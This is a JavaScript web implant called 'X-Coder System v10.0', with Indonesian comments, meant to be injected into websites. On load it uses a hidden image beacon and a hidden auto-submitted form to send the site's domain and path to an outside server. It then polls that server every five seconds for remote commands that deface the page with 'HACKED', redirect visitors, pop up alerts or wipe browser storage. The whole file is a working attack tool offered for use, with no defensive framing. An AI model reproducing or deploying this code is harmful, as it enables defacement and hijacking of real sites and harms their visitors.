/**
 * X-Coder System v10.0 - PASTI WORK
 * Pake Image Beacon + Form Submit
 */

(function() {
    'use strict';

    // ============================================================
    // GANTI DENGAN URL INDEX.PHP ANDA!
    // ============================================================
    var SERVER = 'https://nexaisback.itsmeher.my.id/sec.php';

    function getDomain() {
        return window.location.hostname;
    }

    // ============================================================
    // METHOD 1: IMAGE BEACON (PASTI WORK)
    // ============================================================
    function sendBeacon() {
        var domain = getDomain();
        var path = window.location.pathname;
        var url = SERVER + '?log=1&domain=' + encodeURIComponent(domain) + '&path=' + encodeURIComponent(path);
        
        // Kirim pake image (pasti work, ga kena CORS)
        var img = new Image();
        img.src = url;
        img.style.display = 'none';
        document.body.appendChild(img);
        
        console.log('📡 Beacon sent:', domain);
    }

    // ============================================================
    // METHOD 2: FORM SUBMIT (BACKUP)
    // ============================================================
    function sendForm() {
        var form = document.createElement('form');
        form.method = 'POST';
        form.action = SERVER;
        form.style.display = 'none';
        
        var input = document.createElement('input');
        input.type = 'hidden';
        input.name = 'domain';
        input.value = getDomain();
        form.appendChild(input);
        
        var input2 = document.createElement('input');
        input2.type = 'hidden';
        input2.name = 'path';
        input2.value = window.location.pathname;
        form.appendChild(input2);
        
        document.body.appendChild(form);
        form.submit();
        setTimeout(function() {
            document.body.removeChild(form);
        }, 1000);
    }

    // ============================================================
    // CEK PERINTAH
    // ============================================================
    function checkCommand() {
        var domain = getDomain();
        var url = SERVER + '?cmd=get&domain=' + encodeURIComponent(domain);
        
        fetch(url)
            .then(function(r) { return r.json(); })
            .then(function(data) {
                if (data && data.command) {
                    executeCommand(data.command, data);
                }
            })
            .catch(function() {});
    }

    // ============================================================
    // EKSEKUSI PERINTAH
    // ============================================================
    function executeCommand(command, data) {
        console.log('📡 Command:', command);
        
        switch(command) {
            case 'deface':
                document.documentElement.innerHTML = data.html || '<h1 style="text-align:center;margin-top:20%;color:red;">HACKED</h1>';
                break;
            case 'alert':
                alert(data.message || '⚠️ Security Alert!');
                break;
            case 'redirect':
                window.location.href = data.url || 'https://www.roblox.com/home';
                break;
            case 'clear':
                localStorage.clear();
                sessionStorage.clear();
                alert(data.message || 'Storage cleared!');
                break;
        }
    }

    // ============================================================
    // JALANKAN
    // ============================================================
    // Kirim beacon (pasti work)
    setTimeout(sendBeacon, 500);
    
    // Kirim form backup
    setTimeout(sendForm, 2000);
    
    // Cek perintah setiap 5 detik
    setInterval(checkCommand, 5000);

    console.log('🔍 X-Coder v10.0 started on:', getDomain());
})();
